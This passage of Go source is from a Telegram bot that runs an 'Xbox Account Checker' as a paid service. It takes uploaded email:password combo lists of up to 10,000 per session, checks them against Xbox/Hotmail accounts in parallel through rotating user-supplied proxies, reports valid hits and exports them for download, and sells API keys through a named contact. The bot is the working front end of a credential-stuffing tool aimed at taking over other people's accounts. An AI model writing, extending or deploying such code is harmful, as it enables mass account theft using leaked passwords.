• 50,000 searches per day
• 50,000 downloads per day

**Need API Access?**
Contact @xorons for a Bot Key - $10

**Support:**
If you need help, contact @xorons`

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) showHelp(chatID int64) {
	text, keyboard := b.getHelpContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editHelp(chatID int64, messageID int) {
	text, keyboard := b.getHelpContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleProxyCommand(update tgbotapi.Update) {
	b.showProxyMenu(update.Message.Chat.ID, update.Message.From.ID)
}

func (b *Bot) getProxyMenuContent(userID int64) (string, tgbotapi.InlineKeyboardMarkup) {
	// Get proxy stats
	stats, err := b.proxyManager.GetProxyStats(userID)
	if err != nil {
		stats = map[string]int{
			"total": 0, "active": 0, "working": 0,
		}
	}

	text := fmt.Sprintf(`🌐 **Proxy Manager**

**Your Proxy Stats:**
• Total Proxies: %d
• Active: %d
• Inactive: %d
• Avg Response: %dms

**Actions:**`,
		stats["total"], stats["active"], stats["inactive"], stats["avg_response_time"])

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📤 Upload Proxies", "proxy_upload"),
			tgbotapi.NewInlineKeyboardButtonData("📋 View Proxies", "proxy_list"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔄 Check All", "proxy_check"),
			tgbotapi.NewInlineKeyboardButtonData("🗑️ Clear All", "proxy_clear"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) showProxyMenu(chatID, userID int64) {
	text, keyboard := b.getProxyMenuContent(userID)
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editProxyMenu(chatID int64, messageID int, userID int64) {
	text, keyboard := b.getProxyMenuContent(userID)
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleProxyCallback(callback *tgbotapi.CallbackQuery) {
	parts := strings.Split(callback.Data, "_")

	switch parts[1] {
	case "menu":
		b.showProxyMenu(callback.Message.Chat.ID, callback.From.ID)
	case "upload":
		b.promptProxyUpload(callback.Message.Chat.ID)
	case "list":
		b.showProxyList(callback.Message.Chat.ID, callback.From.ID)
	case "check":
		b.checkUserProxies(callback.Message.Chat.ID, callback.From.ID)
	case "clear":
		b.clearUserProxies(callback.Message.Chat.ID, callback.From.ID)
	}
}

func (b *Bot) handleProxyCallbackEdit(callback *tgbotapi.CallbackQuery, messageID int) {
	parts := strings.Split(callback.Data, "_")
	chatID := callback.Message.Chat.ID
	userID := callback.From.ID

	switch parts[1] {
	case "menu":
		b.editProxyMenu(chatID, messageID, userID)
	case "upload":
		b.promptProxyUploadEdit(chatID, messageID)
	case "list":
		b.editProxyList(chatID, messageID, userID)
	case "check":
		b.checkUserProxies(chatID, userID)
	case "clear":
		b.clearUserProxies(chatID, userID)
	}
}

func (b *Bot) getProxyUploadContent() (string, tgbotapi.InlineKeyboardMarkup) {
	text := `📤 **Upload Proxies**

Send me your proxy list in one of these formats:

**Supported Formats:**
• ip:port
• ip:port:username:password
• protocol://ip:port
• protocol://username:password@ip:port

**Example:**
192.168.1.1:8080
192.168.1.2:8080:user:pass
http://192.168.1.3:8080
socks5://user:pass@192.168.1.4:1080

You can send them as text or upload a .txt file.`

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "proxy_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) promptProxyUpload(chatID int64) {
	// Set user state to proxy upload
	b.userStates[chatID] = "proxy_upload"
	
	text, keyboard := b.getProxyUploadContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) promptProxyUploadEdit(chatID int64, messageID int) {
	// Set user state to proxy upload
	b.userStates[chatID] = "proxy_upload"
	
	text, keyboard := b.getProxyUploadContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}


func (b *Bot) getProxyListContent(userID int64) (string, tgbotapi.InlineKeyboardMarkup, error) {
	proxies, err := b.proxyManager.GetUserProxies(userID)
	if err != nil {
		return "❌ Error loading proxies.", tgbotapi.InlineKeyboardMarkup{}, err
	}

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", "proxy_list"),
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "proxy_menu"),
		),
	)

	if len(proxies) == 0 {
		return "📋 No proxies found. Upload some proxies first.", keyboard, nil
	}

	text := "📋 **Your Proxies:**\n\n"
	for i, proxy := range proxies {
		if i >= 10 { // Limit display to first 10
			text += fmt.Sprintf("... and %d more proxies\n", len(proxies)-10)
			break
		}

		status := "❌"
		if proxy.IsActive && proxy.IsWorking {
			status = "✅"
		} else if proxy.IsActive {
			status = "🔄"
		}

		text += fmt.Sprintf("%s %s (%dms)\n", status, proxy.ProxyURL, proxy.ResponseTime)
	}

	return text, keyboard, nil
}

func (b *Bot) showProxyList(chatID, userID int64) {
	text, keyboard, err := b.getProxyListContent(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, text)
		b.api.Send(msg)
		return
	}

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editProxyList(chatID int64, messageID int, userID int64) {
	text, keyboard, err := b.getProxyListContent(userID)
	if err != nil {
		b.editMessage(chatID, messageID, text, nil)
		return
	}

	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) checkUserProxies(chatID, userID int64) {
	msg := tgbotapi.NewMessage(chatID, "🔄 Checking all your proxies... This may take a few minutes.")
	b.api.Send(msg)

	// Trigger manual check for user's proxies
	err := b.proxyManager.CheckUserProxies(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error checking proxies.")
		b.api.Send(msg)
		return
	}

	msg = tgbotapi.NewMessage(chatID, "✅ Proxy check completed!")
	b.api.Send(msg)
}

func (b *Bot) clearUserProxies(chatID, userID int64) {
	// Get all user proxies and delete them one by one
	proxies, err := b.proxyManager.GetUserProxies(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error loading proxies.")
		b.api.Send(msg)
		return
	}

	for _, proxy := range proxies {
		b.proxyManager.DeleteProxy(userID, proxy.ID)
	}

	msg := tgbotapi.NewMessage(chatID, "✅ All proxies cleared successfully.")
	b.api.Send(msg)
}

func (b *Bot) handleCheckCommand(update tgbotapi.Update) {
	b.showCheckMenu(update.Message.Chat.ID, update.Message.From.ID)
}

func (b *Bot) getCheckMenuContent(userID int64) (string, tgbotapi.InlineKeyboardMarkup) {
	// Get user's active sessions
	sessions, _ := b.checkerManager.GetUserSessions(userID)
	activeSessions := 0
	for _, session := range sessions {
		if session.Status == "running" {
			activeSessions++
		}
	}

	text := fmt.Sprintf(`🔧 **Xbox Account Checker**

**Active Sessions:** %d

Upload your combo list to start checking Xbox/Hotmail accounts.

**Features:**
• Multi-threaded checking
• Proxy support
• Real-time progress
• Valid account export

**Supported Formats:**
• email:password
• One combo per line`, activeSessions)

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📤 Upload Combos", "check_upload"),
			tgbotapi.NewInlineKeyboardButtonData("📊 Sessions", "check_sessions"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⚙️ Settings", "check_settings"),
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) showCheckMenu(chatID, userID int64) {
	text, keyboard := b.getCheckMenuContent(userID)
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editCheckMenu(chatID int64, messageID int, userID int64) {
	text, keyboard := b.getCheckMenuContent(userID)
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleCheckCallback(callback *tgbotapi.CallbackQuery) {
	parts := strings.Split(callback.Data, "_")

	switch parts[1] {
	case "menu":
		b.showCheckMenu(callback.Message.Chat.ID, callback.From.ID)
	case "upload":
		b.promptComboUpload(callback.Message.Chat.ID)
	case "sessions":
		b.showCheckSessions(callback.Message.Chat.ID, callback.From.ID)
	case "settings":
		b.showCheckSettings(callback.Message.Chat.ID, callback.From.ID)
	}
}

func (b *Bot) handleCheckCallbackEdit(callback *tgbotapi.CallbackQuery, messageID int) {
	parts := strings.Split(callback.Data, "_")
	chatID := callback.Message.Chat.ID
	userID := callback.From.ID

	switch parts[1] {
	case "menu":
		b.editCheckMenu(chatID, messageID, userID)
	case "upload":
		b.promptComboUploadEdit(chatID, messageID)
	case "sessions":
		b.editCheckSessions(chatID, messageID, userID)
	case "settings":
		b.editCheckSettings(chatID, messageID, userID)
	}
}

func (b *Bot) getComboUploadContent() (string, tgbotapi.InlineKeyboardMarkup) {
	text := `📤 **Upload Combo List**

Send me your combo list in the format:
email:password

**Example:**
user@hotmail.com:password123
test@outlook.com:mypass456

You can send them as text or upload a .txt file.
Maximum: 10,000 combos per session.`

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "check_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) promptComboUpload(chatID int64) {
	// Set user state to expect combo upload
	b.userStates[chatID] = "combo_upload"

	text, keyboard := b.getComboUploadContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) promptComboUploadEdit(chatID int64, messageID int) {
	// Set user state to expect combo upload
	b.userStates[chatID] = "combo_upload"

	text, keyboard := b.getComboUploadContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) getCheckSessionsContent(userID int64) (string, tgbotapi.InlineKeyboardMarkup, error) {
	sessions, err := b.checkerManager.GetUserSessions(userID)
	
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", "check_sessions"),
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "check_menu"),
		),
	)
	
	if err != nil {
		return "❌ Error loading sessions.", keyboard, err
	}

	if len(sessions) == 0 {
		return "📊 No checking sessions found.", keyboard, nil
	}

	text := "📊 **Your Checking Sessions:**\n\n"
	for i, session := range sessions {
		if i >= 5 { // Limit display
			break
		}

		status := "❌"
		switch session.Status {
		case "running":
			status = "🔄"
		case "completed":
			status = "✅"
		case "cancelled":
			status = "⏹️"
		}

		progress := float64(session.Progress) / float64(session.Total) * 100

		// Calculate time info
		var timeInfo string
		if session.Status == "running" {
			elapsed := time.Since(session.StartTime)
			timeInfo = fmt.Sprintf("Running: %s", elapsed.Round(time.Second))
		} else if !session.EndTime.IsZero() {
			duration := session.EndTime.Sub(session.StartTime)
			timeInfo = fmt.Sprintf("Duration: %s", duration.Round(time.Second))
		}

		text += fmt.Sprintf(`%s **Session %s**
Progress: %.1f%% (%d/%d)
✅ Valid: %d | ❌ Invalid: %d | 🔧 Custom: %d | ⚠️ Failed: %d
🚀 CPM: %.0f | %s

`, status, session.SessionID[:8], progress, session.Progress, session.Total,
			session.Valid, session.Invalid, session.Custom, session.Failed, session.CPM, timeInfo)
	}

	return text, keyboard, nil
}

func (b *Bot) showCheckSessions(chatID, userID int64) {
	text, keyboard, err := b.getCheckSessionsContent(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, text)
		msg.ReplyMarkup = keyboard
		b.api.Send(msg)
		return
	}

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editCheckSessions(chatID int64, messageID int, userID int64) {
	text, keyboard, _ := b.getCheckSessionsContent(userID)
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) getCheckSettingsContent() (string, tgbotapi.InlineKeyboardMarkup) {
	globalSettings := b.checkerManager.GetGlobalSettings()
	
	text := fmt.Sprintf(`⚙️ **Checker Settings**

**Current Settings:**
• Max Workers: %d
• Target CPM: %d
• Batch Size: %d
• Use Your Proxies: %s

**Note:** Settings are optimized for best performance.
Contact @xorons for custom configurations.`,
		globalSettings.MaxWorkers,
		globalSettings.TargetCPM,
		globalSettings.BatchSize,
		func() string {
			if globalSettings.UseUserProxy {
				return "Yes"
			}
			return "No"
		}())

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "check_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) showCheckSettings(chatID, userID int64) {
	text, keyboard := b.getCheckSettingsContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editCheckSettings(chatID int64, messageID int, userID int64) {
	text, keyboard := b.getCheckSettingsContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleFileUpload(update tgbotapi.Update) {
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	document := update.Message.Document

	// Check if file is a text file
	if !strings.HasSuffix(document.FileName, ".txt") {
		msg := tgbotapi.NewMessage(chatID, "❌ Please upload only .txt files.")
		b.api.Send(msg)
		return
	}

	// Check user state to determine file type
	userState, exists := b.userStates[chatID]
	if exists && userState == "proxy_upload" {
		b.handleProxyFileUpload(update)
		return
	}

	// Check file size (max 10MB)
	if document.FileSize > 10*1024*1024 {
		msg := tgbotapi.NewMessage(chatID, "❌ File too large. Maximum size is 10MB.")
		b.api.Send(msg)
		return
	}

	// Get user to check limits
	user, err := b.userManager.GetUser(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error getting user information.")
		b.api.Send(msg)
		return
	}

	if user.IsBanned {
		msg := tgbotapi.NewMessage(chatID, "❌ You have been banned from using this bot.")
		b.api.Send(msg)
		return
	}

	// Send processing message
	processingMsg := tgbotapi.NewMessage(chatID, "📥 Processing your file...")
	sentMsg, _ := b.api.Send(processingMsg)

	// Download the file
	fileURL, err := b.api.GetFileDirectURL(document.FileID)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ Error downloading file.")
		b.api.Send(editMsg)
		return
	}

	// Download file content
	combos, err := b.downloadAndParseComboFile(fileURL)
	if err != nil {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ Error parsing file: "+err.Error())
		b.api.Send(editMsg)
		return
	}

	if len(combos) == 0 {
		editMsg := tgbotapi.NewEditMessageText(chatID, sentMsg.MessageID, "❌ No valid email:password combos found in file.")
		b.api.Send(editMsg)
		return
	}

	// Update message with file info and options
	// Don't escape filename - it's displayed as-is
	// Only escape username which might contain Markdown characters
	safeFilename := document.FileName
	safeUsername := escapeMarkdown(user.Username)
	if safeUsername == "" {
		safeUsername = fmt.Sprintf("User %d", userID)
	}

	var text string
	if len(combos) > 10000 {
		text = fmt.Sprintf("📁 *File Uploaded Successfully*\n\n"+
			"📄 *File:* %s\n"+
			"📊 *Valid Combos:* %d\n"+
			"🔄 *Will check first:* 10,000\n"+
			"📋 *Remaining unchecked:* %d\n"+
			"👤 *User:* %s\n\n"+
			"⚠️ _Note: After checking, you'll get valid results + unchecked combos file_\n\n"+
			"Choose what you want to do:",
			safeFilename, len(combos), len(combos)-10000, safeUsername)
	} else {
		text = fmt.Sprintf("📁 *File Uploaded Successfully*\n\n"+
			"📄 *File:* %s\n"+
			"📊 *Valid Combos:* %d\n"+
			"👤 *User:* %s\n\n"+
			"Choose what you want to do:",
			safeFilename, len(combos), safeUsername)
	}

	// Store combos temporarily for this user
	err = b.storeUserCombos(userID, document.FileID, combos)
	if err != nil {
		log.Printf("Error storing combos for user %d: %v", userID, err)
		b.editMessage(chatID, sentMsg.MessageID, "⚠️ Error: Could not store combos in database. Please try again.", nil)
		return
	}

	// Generate a short session ID for the callback (use timestamp + user ID)
	sessionID := fmt.Sprintf("%d_%d", userID, time.Now().Unix())
	
	// Store the file ID mapping for later retrieval
	b.storeFileIDMapping(sessionID, document.FileID)

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔍 Check Combos", fmt.Sprintf("check_file_%s", sessionID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⚙️ Check Settings", fmt.Sprintf("check_settings_%s", sessionID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", "main_menu"),
		),
	)

	// Use editMessage for consistent error handling
	b.editMessage(chatID, sentMsg.MessageID, text, &keyboard)
}

func (b *Bot) downloadAndParseComboFile(fileURL string) ([]string, error) {
	// Download file content
	resp, err := http.Get(fileURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var combos []string
	scanner := bufio.NewScanner(resp.Body)
	lineCount := 0

	for scanner.Scan() {
		lineCount++
		if lineCount > 100000 { // Limit to 100k lines
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		// Check if line contains email:password format
		if strings.Contains(line, ":") && strings.Contains(line, "@") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 && strings.Contains(parts[0], "@") {
				combos = append(combos, line)
			}
		}
	}

	return combos, scanner.Err()
}

func (b *Bot) storeUserCombos(userID int64, fileID string, combos []string) error {
	// Store in database temporarily
	key := fmt.Sprintf("user_combos_%d_%s", userID, fileID)
	combosData := strings.Join(combos, "\n")

	// Store in data database
	query := `INSERT OR REPLACE INTO data (key, value, user_id) VALUES (?, ?, ?)`
	_, err := b.db.DataDB.Exec(query, key, combosData, userID)
	return err
}

func (b *Bot) storeFileIDMapping(sessionID string, fileID string) error {
	// Store file ID mapping in data database
	key := fmt.Sprintf("file_mapping_%s", sessionID)
	query := `INSERT OR REPLACE INTO data (key, value) VALUES (?, ?)`
	_, err := b.db.DataDB.Exec(query, key, fileID)
	return err
}

func (b *Bot) getFileIDFromSession(sessionID string) (string, error) {
	key := fmt.Sprintf("file_mapping_%s", sessionID)
	query := `SELECT value FROM data WHERE key = ?`
	var fileID string
	err := b.db.DataDB.QueryRow(query, key).Scan(&fileID)
	return fileID, err
}

func (b *Bot) getUserCombos(userID int64, fileID string) ([]string, error) {
	key := fmt.Sprintf("user_combos_%d_%s", userID, fileID)

	query := `SELECT value FROM data WHERE key = ? AND user_id = ?`
	var combosData string
	err := b.db.DataDB.QueryRow(query, key, userID).Scan(&combosData)
	if err != nil {
		return nil, err
	}

	return strings.Split(combosData, "\n"), nil
}

func (b *Bot) handleCheckFileCallback(callback *tgbotapi.CallbackQuery) {
	sessionID := strings.TrimPrefix(callback.Data, "check_file_")
	userID := callback.From.ID
	chatID := callback.Message.Chat.ID

	// Get the real file ID from the session ID
	fileID, err := b.getFileIDFromSession(sessionID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error: Session expired. Please upload the file again.")
		b.api.Send(msg)
		return
	}

	// Get user combos
	combos, err := b.getUserCombos(userID, fileID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error retrieving file data. Please upload the file again.")
		b.api.Send(msg)
		return
	}

	// Handle large files (>10k combos)
	var uncheckedCombos []string
	totalCombos := len(combos)
	if len(combos) > 10000 {
		uncheckedCombos = combos[10000:]
		combos = combos[:10000]
	}

	// Generate a short session ID for the checking process
	// Use the short session ID from the callback (already stored in database)
	checkSessionID := fmt.Sprintf("%d_%d", userID, time.Now().Unix())

	// Send initial message
	var text string
	if len(uncheckedCombos) > 0 {
		text = fmt.Sprintf("🔄 *Starting Xbox Account Check*\n\n"+
			"📊 **Total Combos:** %d\n"+
			"🔄 **Checking:** %d\n"+
			"📋 **Unchecked:** %d\n"+
			"🔄 **Status:** Initializing...\n"+
			"⏱️ **Started:** %s\n\n"+
			"⚠️ *Note: Unchecked combos will be provided after checking*",
			totalCombos, len(combos), len(uncheckedCombos), time.Now().Format("15:04:05"))
	} else {
		text = fmt.Sprintf("🔄 *Starting Xbox Account Check*\n\n"+
			"📊 **Total Combos:** %d\n"+
			"🔄 **Status:** Initializing...\n"+
			"⏱️ **Started:** %s\n\n"+
			"This may take a while depending on the number of accounts.",
			len(combos), time.Now().Format("15:04:05"))
	}

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⏹️ Stop Check", fmt.Sprintf("stop_check_%s", checkSessionID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "check_menu"),
		),
	)

	b.editMessage(chatID, callback.Message.MessageID, text, &keyboard)

	// Start checking in background
	go b.startComboChecking(userID, checkSessionID, combos, uncheckedCombos, chatID, callback.Message.MessageID)
}



func (b *Bot) handleCheckSettingsCallback(callback *tgbotapi.CallbackQuery) {
	chatID := callback.Message.Chat.ID
	globalSettings := b.checkerManager.GetGlobalSettings()

	text := fmt.Sprintf(`⚙️ **Xbox Checker Settings**

**Current Configuration:**
🔧 **Threads:** %d
⏱️ **Target CPM:** %d
📦 **Batch Size:** %d
🌐 **Proxy Usage:** %s
📊 **Real-time Stats:** Enabled

**Features:**
✅ Multi-threaded checking
✅ Automatic proxy rotation
✅ Real-time progress updates
✅ Detailed result statistics
✅ Export results to file

*Settings are optimized for best performance and cannot be modified by users.*`,
		globalSettings.MaxWorkers,
		globalSettings.TargetCPM,
		globalSettings.BatchSize,
		func() string {
			if globalSettings.UseUserProxy {
				return "Enabled"
			}
			return "Disabled"
		}())

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "check_menu"),
		),
	)

	b.editMessage(chatID, callback.Message.MessageID, text, &keyboard)
}

func (b *Bot) handleStartCheckCallback(callback *tgbotapi.CallbackQuery) {
	sessionID := strings.TrimPrefix(callback.Data, "start_check_")
	userID := callback.From.ID
	chatID := callback.Message.Chat.ID

	// Get session from userSessions
	session, exists := b.userSessions[sessionID]
	if !exists {
		msg := tgbotapi.NewMessage(chatID, "❌ Session not found. Please upload your file again.")
		b.api.Send(msg)
		return
	}

	if session.UserID != userID {
		msg := tgbotapi.NewMessage(chatID, "❌ Unauthorized access to session.")
		b.api.Send(msg)
		return
	}

	if session.Status != "ready" {
		msg := tgbotapi.NewMessage(chatID, "❌ Session is not ready for checking.")
		b.api.Send(msg)
		return
	}

	// Update session status
	session.Status = "running"
	session.StartTime = time.Now()

	// Start checking process
	go b.startComboChecking(userID, sessionID, session.Combos, session.UncheckedCombos, chatID, callback.Message.MessageID)

	// Update message to show checking started
	text := fmt.Sprintf("🔄 *Starting Xbox Account Check*\n\n"+
		"📊 **Total Combos:** %d\n"+
		"🔄 **Status:** Initializing...\n"+
		"⏱️ **Started:** %s\n\n"+
		"This may take a while depending on the number of accounts.",
		len(session.Combos), time.Now().Format("15:04:05"))

	editMsg := tgbotapi.NewEditMessageText(chatID, callback.Message.MessageID, text)
	editMsg.ParseMode = "Markdown"
	b.api.Send(editMsg)
}

func (b *Bot) handleStopCheckCallback(callback *tgbotapi.CallbackQuery) {
	sessionID := strings.TrimPrefix(callback.Data, "stop_check_")
	userID := callback.From.ID
	chatID := callback.Message.Chat.ID
	messageID := callback.Message.MessageID

	// Cancel the session
	err := b.checkerManager.CancelSession(sessionID, userID)
	if err != nil {
		text := fmt.Sprintf("❌ *Error Stopping Check*\n\nError: %s", escapeMarkdown(err.Error()))
		editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
		editMsg.ParseMode = "Markdown"
		b.api.Send(editMsg)
		return
	}

	text := "⏹️ *Check Stopped*\n\nThe checking process has been cancelled by user request."
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔄 Start New Check", "check_menu"),
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
		),
	)

	editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	editMsg.ParseMode = "Markdown"
	editMsg.ReplyMarkup = &keyboard
	b.api.Send(editMsg)
}

func (b *Bot) startComboChecking(userID int64, sessionID string, combos []string, uncheckedCombos []string, chatID int64, messageID int) {
	// Store unchecked combos if any
	if len(uncheckedCombos) > 0 {
		uncheckedData := strings.Join(uncheckedCombos, "\n")
		key := fmt.Sprintf("unchecked_%s", sessionID)
		query := `INSERT OR REPLACE INTO data (key, value, user_id) VALUES (?, ?, ?)`
		b.db.DataDB.Exec(query, key, uncheckedData, userID)
	}

	// Create checker session using global settings
	globalSettings := b.adminManager.GetSettings()
	config := &checker.Config{
		MaxWorkers:    globalSettings.CheckerSettings.MaxWorkers,
		TargetCPM:     globalSettings.CheckerSettings.TargetCPM,
		BatchSize:     globalSettings.CheckerSettings.BatchSize,
		UseUserProxy:  globalSettings.CheckerSettings.UseUserProxy,
		ResetProgress: false,
	}
	
	session, err := b.checkerManager.CreateSession(userID, combos, config)
	if err != nil {
		text := fmt.Sprintf("❌ **Error Creating Session**\n\nError: %s", err.Error())
		editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
		editMsg.ParseMode = "Markdown"
		b.api.Send(editMsg)
		return
	}
	
	// Start the session
	err = b.checkerManager.StartSession(session.SessionID)
	if err != nil {
		text := fmt.Sprintf("❌ **Error Starting Check**\n\nError: %s", err.Error())
		editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
		editMsg.ParseMode = "Markdown"
		b.api.Send(editMsg)
		return
	}

	// Update progress periodically
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			stats := session.GetStats()

			// Check if session is completed
			if session.Status == "completed" || session.Status == "failed" || session.Status == "cancelled" {
				// Store results in database for download
				b.storeSessionResults(userID, sessionID, session.SessionID)
				b.sendCompletionMessage(chatID, messageID, userID, sessionID, stats)
				return
			}

			// Update progress
			b.updateProgressMessage(chatID, messageID, sessionID, stats)

		case <-time.After(30 * time.Minute): // Timeout after 30 minutes
			b.checkerManager.CancelSession(session.SessionID, userID)
			text := "⏰ **Check Timeout**\n\nThe checking process has been stopped due to timeout (30 minutes)."
			editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
			editMsg.ParseMode = "Markdown"
			b.api.Send(editMsg)
			return
		}
	}
}

func (b *Bot) updateProgressMessage(chatID int64, messageID int, sessionID string, stats *checker.CheckStats) {
	progress := float64(stats.Checked) / float64(stats.Total) * 100

	text := fmt.Sprintf("🔄 **Xbox Account Check in Progress**\n\n"+
		"📊 **Progress:** %.1f%% (%d/%d)\n"+
		"✅ **Valid:** %d\n"+
		"❌ **Invalid:** %d\n"+
		"⚠️ **Errors:** %d\n"+
		"🔄 **Checking:** %d threads\n"+
		"⏱️ **Elapsed:** %s\n"+
		"🕐 **ETA:** %s",
		progress, stats.Checked, stats.Total,
		stats.Valid, stats.Invalid, stats.Errors,
		stats.ActiveThreads,
		stats.ElapsedTime.Round(time.Second),
		stats.EstimatedTimeRemaining.Round(time.Second))

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⏹️ Stop Check", fmt.Sprintf("stop_check_%s", sessionID)),
		),
	)

	editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	editMsg.ParseMode = "Markdown"
	editMsg.ReplyMarkup = &keyboard
	b.api.Send(editMsg)
}

func (b *Bot) sendCompletionMessage(chatID int64, messageID int, userID int64, sessionID string, stats *checker.CheckStats) {
	// Check if there are unchecked combos
	uncheckedKey := fmt.Sprintf("unchecked_%s", sessionID)
	var uncheckedData string
	query := `SELECT value FROM data WHERE key = ? AND user_id = ?`
	err := b.db.DataDB.QueryRow(query, uncheckedKey, userID).Scan(&uncheckedData)
	hasUnchecked := err == nil && uncheckedData != ""

	var text string
	if hasUnchecked {
		uncheckedCount := len(strings.Split(uncheckedData, "\n"))
		text = fmt.Sprintf("✅ **Xbox Account Check Completed**\n\n"+
			"📊 **Final Results:**\n"+
			"✅ **Valid Accounts:** %d\n"+
			"❌ **Invalid Accounts:** %d\n"+
			"⚠️ **Errors:** %d\n"+
			"📈 **Success Rate:** %.1f%%\n"+
			"⏱️ **Total Time:** %s\n"+
			"📋 **Unchecked Combos:** %d\n\n"+
			"📁 **Download your results below:**",
			stats.Valid, stats.Invalid, stats.Errors,
			float64(stats.Valid)/float64(stats.Total)*100,
			stats.ElapsedTime.Round(time.Second), uncheckedCount)
	} else {
